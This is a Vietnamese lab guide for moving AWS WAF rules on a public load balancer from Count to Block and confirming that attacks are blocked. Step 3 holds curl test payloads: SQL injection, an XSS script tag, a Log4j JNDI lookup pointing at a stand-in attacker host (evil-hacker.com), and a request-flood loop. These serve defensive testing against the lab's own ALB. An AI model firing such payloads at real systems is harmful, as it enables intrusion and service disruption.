# 07.04 — Quy Trình Chuyển Đổi An Toàn Count-to-Block & Kiểm Thử Chặn Tấn Công L7

> **Mã bài lab:** `07.04`  
> **Trạng thái:** `READY FOR IMPLEMENTATION`  
> **Thời gian dự kiến:** 45 phút  
> **Chi phí ước tính:** $0.00 USD  
> **Vùng áp dụng:** `ap-southeast-1` (Singapore)  

---

## 1. Tiền đề (Prerequisites)

- Đã hoàn thành toàn bộ các bài lab [07.01](01-acm-public-tls-certificate.md), [07.02](02-aws-wafv2-web-acl-setup.md), và [07.03](03-internet-facing-alb-ingress.md).
- Application Load Balancer công khai đang ở trạng thái `active` và đã được gắn Web ACL `fabric-edge-web-acl`.
- Các request thông thường truy cập dịch vụ Frontend hoạt động ổn định (HTTP 200).
- Đang mở phiên AWS Management Console tại Singapore `ap-southeast-1`.

---

## 2. Quyền IAM Yêu Cầu (Required IAM Permissions)

Các hành động IAM cần thiết để thực thi bài lab này:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "wafv2:GetWebACL",
        "wafv2:UpdateWebACL",
        "logs:StartQuery",
        "logs:GetQueryResults",
        "logs:FilterLogEvents"
      ],
      "Resource": "*"
    }
  ]
}
```

---

## 3. Cảnh Báo & Ước Tính Chi Phí (Cost & Safety Warnings)

- **Chi phí:** $0.00 USD.
- **Cảnh báo Chuyển Đổi An Toàn (Zero False-Positives):** Quá trình chuyển đổi từ Count sang Block là một thao tác nhạy cảm trong an ninh mạng. Kiến trúc sư an ninh bắt buộc phải đối soát log trong giai đoạn Count trước khi bật Block. Bất kỳ header hoặc tham số URL hợp lệ nào của ứng dụng bị vi phạm phải được đưa vào danh mục Rule Action Overrides hoặc Rule Exclusions trước khi kích hoạt chặn.

---

## 4. Các Bước Thực Hiện Chi Tiết Trên Console (Console Walkthrough)

### Bước 1: Rà Soát Nhật Ký WAF Trong Giai Đoạn Đếm (Count Analysis)
1. Mở **AWS WAF & Shield Console** tại Singapore `ap-southeast-1`.
2. Menu bên trái chọn **Web ACLs** -> Nhấp vào `fabric-edge-web-acl`.
3. Chọn tab **CloudWatch metrics**:
   - Quan sát biểu đồ **Sampled requests** và **All incoming requests**.
   - Kiểm tra xem các request hợp lệ từ trình duyệt có bị gắn nhãn vi phạm (Counted) bởi `AWSManagedRulesCommonRuleSet` hay không.
4. Mở **CloudWatch Logs Insights** để chạy truy vấn đối soát:
   - Chọn Log Group: `aws-waf-logs-fabric-edge-waf`.
   - Dán câu truy vấn:
     ```sql
     fields @timestamp, httpRequest.clientIp, action, terminatingRuleId, httpRequest.uri
     | filter action = "COUNT"
     | stats count(*) as CountEvents by terminatingRuleId, httpRequest.uri
     | sort CountEvents desc
     ```
   - Nhấp **Run query**. Xác nhận không có URI hợp lệ nào của ứng dụng bị đếm nhầm.

---

### Bước 2: Chuyển Đổi Toàn Bộ Quy Tắc Sang Chế Độ Chặn (Block Mode)
Quay lại trang chi tiết `fabric-edge-web-acl` trên WAF Console:
1. Chọn tab **Rules** ở giữa màn hình.
2. Nhấp vào nút **Edit** ở góc trên bên phải bảng danh sách Rules.

3. **Chuyển đổi 3 nhóm AWS Managed Rule Groups:**
   - **Nhóm 1 — `AWSManagedRulesCommonRuleSet`:**
     - Tìm dòng rule group -> Nhấp **Edit**.
     - Bỏ chọn checkbox **Set all rule actions to count** (Chuyển về hành vi mặc định của rule group là **Block**).
     - Nhấp **Save rule**.
   - **Nhóm 2 — `AWSManagedRulesKnownBadInputsRuleSet`:**
     - Nhấp **Edit** -> Bỏ chọn **Set all rule actions to count** -> Nhấp **Save rule**.
   - **Nhóm 3 — `AWSManagedRulesAmazonIpReputationList`:**
     - Nhấp **Edit** -> Bỏ chọn **Set all rule actions to count** -> Nhấp **Save rule**.

4. **Chuyển đổi quy tắc Giới Hạn Tần Suất (`fabric-rate-limit-rule`):**
   - Tìm dòng rule `fabric-rate-limit-rule` -> Nhấp **Edit**.
   - Cuộn xuống mục **Action**:
     - Đổi từ `Count` sang: **`Block`**.
     - Mở rộng mục **Custom response**:
       - Chọn **Enable custom response**.
       - Response code: Nhập `429` (HTTP 429 Too Many Requests chuẩn mực).
       - Response body: Chọn **None** hoặc tạo Custom JSON `{"error": "Too Many Requests - Rate Limit Exceeded"}`.
     - Nhấp **Save rule**.

5. Nhấp nút cam **Save** ở cuối trang để áp dụng toàn bộ các thay đổi vào Web ACL.
6. Xác nhận trên bảng Rules, cột Action của tất cả 4 rules đã chuyển từ `Count` sang **`Block`**.

---

### Bước 3: Kiểm Thử Chặn Thực Tế Các Payload Tấn Công L7
Lấy DNS Name của Public ALB:
```bash
ALB_DNS=$(aws elbv2 describe-load-balancers --region ap-southeast-1 --query 'LoadBalancers[?Scheme==`internet-facing`].DNSName | [0]' --output text)
echo "Target ALB: $ALB_DNS"
```

Thực hiện gửi các payload tấn công mô phỏng từ máy trạm ngoài Internet:

1. **Thử nghiệm 1 — Tấn công SQL Injection (SQLi):**
   ```bash
   curl -Iv "https://$ALB_DNS/?id=1'%20OR%20'1'='1" -k
   ```
   **Kết quả kỳ vọng:** AWS WAF chặn đứng ngay lập tức tại L7, trả về:
   `HTTP/2 403 Forbidden` (hoặc `HTTP/1.1 403 Forbidden`).

2. **Thử nghiệm 2 — Tấn công Cross-Site Scripting (XSS):**
   ```bash
   curl -Iv "https://$ALB_DNS/?search=<script>alert('XSS_ATTACK')</script>" -k
   ```
   **Kết quả kỳ vọng:** `HTTP/2 403 Forbidden`.

3. **Thử nghiệm 3 — Khai thác Log4j JNDI Injection:**
   ```bash
   curl -Iv -H "User-Agent: \${jndi:ldap://evil-hacker.com/payload}" "https://$ALB_DNS/" -k
   ```
   **Kết quả kỳ vọng:** `HTTP/2 403 Forbidden` do `AWSManagedRulesKnownBadInputsRuleSet` chặn.

4. **Thử nghiệm 4 — Tấn công quá tải tần suất (Rate Limiting Spike):**
   Sử dụng vòng lặp gửi nhanh hơn 500 requests trong vòng 1 phút từ cùng 1 IP:
   ```bash
   for i in {1..520}; do curl -s -o /dev/null -w "%{http_code}\n" "https://$ALB_DNS/" -k; done | sort | uniq -c
   ```
   **Kết quả kỳ vọng:** Các requests vượt ngưỡng 500 bắt đầu nhận mã lỗi `429 Too Many Requests`.

---

## 5. Lệnh Kiểm Tra / CLI Verification (Zero Fake Data)

Truy vấn CloudWatch Logs Insights để lấy bằng chứng về các sự kiện BLOCK:
```bash
# Truy vấn các sự kiện BLOCK vừa diễn ra kèm IP và tên Rule chặn
aws logs filter-log-events --region ap-southeast-1 \
  --log-group-name aws-waf-logs-fabric-edge-waf \
  --filter-pattern '{ $.action = "BLOCK" }' \
  --max-items 5 \
  --query 'events[*].message' \
  --output text
```

---

## 6. Kế Hoạch Khôi Phục / Rollback Plan

Nếu phát sinh chặn nhầm người dùng hợp lệ trong quá trình vận hành:
1. Mở WAF Console -> Web ACLs -> `fabric-edge-web-acl` -> Rules -> Edit.
2. Tạm thời bật lại checkbox `Set all rule actions to count` trên Rule Group gây lỗi.
3. Nhấp **Save**.

---

## 7. Đường Dẫn Bằng Chứng (Expected Evidence Path)

Kết quả thực thi runtime (raw CLI JSON, log captures, screenshots) được lưu trữ tại:
`evidence/07-waf/04-waf-block-evidence.log`

---

## 8. Tiêu Chí Nghiệm Thu (Acceptance Checklist)

- [ ] Toàn bộ các rule groups của `fabric-edge-web-acl` đã chuyển đổi thành công sang hành vi `Block`.
- [ ] Quy tắc Rate Limit chặn thành công và trả về mã lỗi `HTTP 429`.
- [ ] Cả 3 payload thử nghiệm (SQLi, XSS, Log4j) đều bị từ chối với mã lỗi `HTTP 403 Forbidden`.
- [ ] CloudWatch Log Group `aws-waf-logs-fabric-edge-waf` ghi nhận đầy đủ bản ghi chặn kèm IP nguồn và timestamp.
